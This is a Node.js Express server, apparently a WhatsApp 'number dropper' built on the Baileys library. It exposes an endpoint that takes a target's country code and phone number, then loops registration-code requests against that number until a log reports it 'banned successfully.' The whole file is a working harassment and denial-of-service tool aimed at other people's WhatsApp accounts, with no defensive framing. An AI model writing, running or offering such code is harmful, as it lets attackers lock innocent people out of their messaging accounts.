const express = require('express');
const app = express();
const fs = require('fs');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const pino = require('pino');

app.use(express.json());

const numbers = JSON.parse(fs.readFileSync('./numbers.json'));

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.oiii');
  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  });

  app.get('/dropNumber', async (req, res) => {
    const { ddi, number } = req.body;
    const phoneNumber = ddi + number;
    try {
      const result = await dropNumber({ phoneNumber, ddi, number });
      res.status(200).json(result);
    } catch (error) {
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    try {
      while (true) {
        console.clear();
        console.log(`Dropping number: ${phoneNumber}`);
        const res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        });
        if (res.reason === 'temporarily_unavailable') {
          setTimeout(async () => {
            await dropNumber(context);
          }, res.retry_after * 90000000);
        } else {
          console.log('Número baneado exitosamente');
          return { success: true };
        }
      }
    } catch (error) {
      console.error(error);
      throw error;
    }
  };

  const PORT = process.env.PORT || 3000;
  app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
  });
};

start();
